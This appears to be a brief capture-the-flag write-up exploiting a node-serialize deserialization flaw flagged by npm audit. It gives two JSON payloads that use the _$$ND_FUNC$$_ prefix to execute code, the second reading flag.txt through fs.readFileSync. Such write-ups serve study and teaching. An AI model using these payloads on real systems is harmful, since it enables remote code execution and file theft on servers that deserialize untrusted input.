By downloading the .tar.gz file and running `npm install` we see `npm` triggering on node-serialize with:
https://github.com/advisories/GHSA-q4v7-4rhw-9hqm

This leads to https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ where we discover that we can invoke functions like this:

```
{
 "hello": "_$$ND_FUNC$$_function(){return 'world'}()"
}
```

All we have to do now is to use `fs` and `readFileSync` to get the file contents:

```
{
 "hello": "_$$ND_FUNC$$_function(){return require('fs').readFileSync('flag.txt','utf8') }()"
}
```